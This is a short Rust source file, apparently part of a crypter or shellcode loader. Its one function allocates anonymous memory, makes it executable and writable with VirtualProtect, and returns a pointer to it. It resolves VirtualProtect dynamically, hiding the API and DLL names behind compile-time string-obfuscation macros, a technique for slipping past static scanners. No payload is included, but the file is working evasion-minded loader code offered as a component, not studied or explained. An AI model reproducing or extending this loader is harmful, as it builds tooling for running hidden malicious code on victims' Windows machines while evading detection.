use crate::utils::{load_library, get_proc_address};
pub unsafe fn alloc_mem(size: usize) -> Result<*mut u8, String> {
    use rustcrypt_ct_macros::{obf_lit, obf_lit_bytes};
    use core::ffi::c_void;

    type VirtualProtectFn = unsafe extern "system" fn(lp_address: *mut c_void, dw_size: usize, fl_new_protect: u32, lpfl_old_protect: *mut u32) -> i32;

    let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;
    let virtual_protect: VirtualProtectFn = core::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"VirtualProtect\0").as_slice())?);

    let mmap = match memmap2::MmapMut::map_anon(size) {
        Ok(m) => m,
        Err(_) => return Err(obf_lit!("mmap anonymous failed").to_string()),
    };
    let boxed = Box::new(mmap);
    let leaked: &'static mut memmap2::MmapMut = Box::leak(boxed);
    let p = leaked.as_mut_ptr();
    let mut old_protect = 0u32;
    let ok = virtual_protect(p as *mut _, size, 0x40, &mut old_protect); // PAGE_EXECUTE_READWRITE
    if ok == 0 {
        return Err(obf_lit!("VirtualProtect failed").to_string());
    }
    Ok(p as *mut u8)
}